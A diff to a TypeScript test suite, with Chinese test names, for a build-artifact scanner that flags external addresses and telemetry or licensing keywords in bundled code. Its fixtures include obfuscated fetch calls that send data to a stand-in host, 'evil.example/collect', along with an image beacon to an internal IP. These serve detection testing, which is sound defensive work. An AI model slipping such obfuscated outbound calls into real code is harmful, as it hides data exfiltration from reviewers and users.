@@ -186,6 +186,47 @@ describe('US-M1-11 A01 产物扫描：外部地址与关键字', () => {
     expect(rules(code)).toEqual(['artifacts/address'])
   })
 
+  /* eslint-disable no-template-curly-in-string */
+  it.each([
+    ['协议由插值给出', 'fetch(`${location.protocol}//evil.example/collect`)', 'evil.example'],
+    ['拼接出的地址（转义的斜杠）', 'fetch("https:"+"\\/\\/evil.example/c")', 'evil.example'],
+    ['协议相对的本机地址', 'fetch("//localhost:3000/api")', 'localhost:3000'],
+    ['协议相对的 IP 地址', 'new Image().src="//10.0.0.8/p.gif"', '10.0.0.8'],
+    ['协议相对的 IPv6 地址', 'fetch("//[::1]:8080/x")', '[::1]:8080'],
+    ['Unicode 转义的斜杠', 'fetch("https:\\u002F\\u002Fevil.example")', 'evil.example'],
+    ['正则里的地址', 'const r=/https:\\/\\/evil\\.example/', 'evil.example'],
+  ])('违规（DEF-016）：按语法树取出的值识别地址：%s', (_case, code, host) => {
+    const result = scan(code)
+    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
+    expect([...result.hosts.keys()]).toEqual([host])
+  })
+  /* eslint-enable no-template-curly-in-string */
+
+  it.each([
+    ['两个斜杠的注释样式的字符串', 'const c="// 说明"'],
+    ['只有两个斜杠', 'const p=a+"//"+b'],
+    ['源码映射的注释', 'const s="//# sourceMappingURL=x.js.map"'],
+    ['路径里的两个斜杠', 'const p="a//b.example"'],
+    ['注释里的协议相对写法', '/* //evil.example */ const a=1'],
+  ])('合规：不是地址的写法不误报：%s', (_case, code) => {
+    expect(rules(code)).toEqual([])
+  })
+
+  it('注释里的绝对地址照样报出', () => {
+    expect(rules('/*! see https://evil.example/license */ const a=1')).toEqual(['artifacts/address'])
+  })
+
+  it('前缀的登记（编辑器的产物）：以它开头的地址放行，别的前缀与平台页面的产物照旧违规', () => {
+    const prefixed: ArtifactPolicy = { ...policy, allowedAddresses: [{ address: 'https://support.example.com/docs/', prefix: true, source: '样例', reason: '公式帮助的链接' }] }
+    const code = 'a={url:"https://support.example.com/docs/sum-function"};b="https://support.example.com/other"'
+    const editor = scanArtifacts([{ path: 'assets/editor.js', content: code }], prefixed)
+    expect(editor.violations.map(v => v.detail.split(' ')[0])).toEqual(['https://support.example.com/other'])
+    expect(editor.unusedAddresses).toEqual([])
+    const platform = scanArtifacts([{ path: 'assets/index.js', content: code }], prefixed, { strictFiles: new Set(['assets/index.js']) })
+    expect(platform.violations).toHaveLength(2)
+    expect(platform.unusedAddresses).toEqual(['https://support.example.com/docs/'])
+  })
+
   it.each(['Sentry.init({dsn:d})', 'new PostHog()', 'o.license_key="x"', 'o.licenseKey="x"', 'import("@univerjs-pro/license")', 'https://www.googletagmanager.com/gtag/js'])('违规：关键字（不区分大小写）%s', (code) => {
     expect(rules(code)).toContain('artifacts/keyword')
   })
@@ -196,11 +237,13 @@ describe('US-M1-11 A01 产物扫描：外部地址与关键字', () => {
     expect(result.unusedAddresses).toEqual(['http://localhost'])
   })
 
-  it('真实的允许清单：每一项都是合法的绝对地址，写明来源与用途，没有重复', () => {
+  it('真实的允许清单：每一项都是合法的绝对地址，写明来源与用途，没有重复；前缀至少写到路径的第一段', () => {
     const { allowedAddresses } = ARTIFACT_POLICY
     for (const entry of allowedAddresses) {
       expect(() => new URL(entry.address), entry.address).not.toThrow()
       expect(entry.source.length > 0 && entry.reason.length > 0, entry.address).toBe(true)
+      if (entry.prefix === true)
+        expect(new URL(entry.address).pathname.length, entry.address).toBeGreaterThan(1)
     }
     expect(new Set(allowedAddresses.map(entry => entry.address.toLowerCase())).size).toBe(allowedAddresses.length)
   })
